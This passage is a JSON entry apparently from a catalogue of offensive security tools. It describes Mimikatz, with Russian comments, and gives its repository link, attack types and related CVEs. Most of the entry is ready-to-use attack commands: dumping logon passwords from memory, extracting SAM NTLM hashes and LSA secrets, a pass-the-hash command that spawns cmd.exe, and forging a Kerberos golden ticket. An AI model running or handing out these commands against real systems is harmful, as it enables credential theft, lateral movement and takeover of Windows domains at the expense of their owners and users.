  {
    "id": "TOOL-006",
    "name": "Mimikatz",
    "type": "post_exploitation",
    "description": "Инструмент для извлечения учётных данных из памяти Windows",
    "url": "https://github.com/gentilkiwi/mimikatz",
    "applicable_attack_types": ["credential_dumping", "privilege_escalation"],
    "applicable_cve": ["CVE-2020-1472", "CVE-2021-34527", "CVE-2023-23397"],
    "commands": {
      "default": [
        "# Запуск Mimikatz с правами администратора",
        "privilege::debug",
        "sekurlsa::logonpasswords",
        "",
        "# Извлечение хешей NTLM из SAM",
        "lsadump::sam",
        "",
        "# Дамп LSA секретов",
        "lsadump::secrets",
        "",
        "# Pass-the-Hash атака",
        "sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:cmd.exe",
        "",
        "# Golden Ticket (требуется hash krbtgt)",
        "kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<HASH> /id:500"
      ]
    },
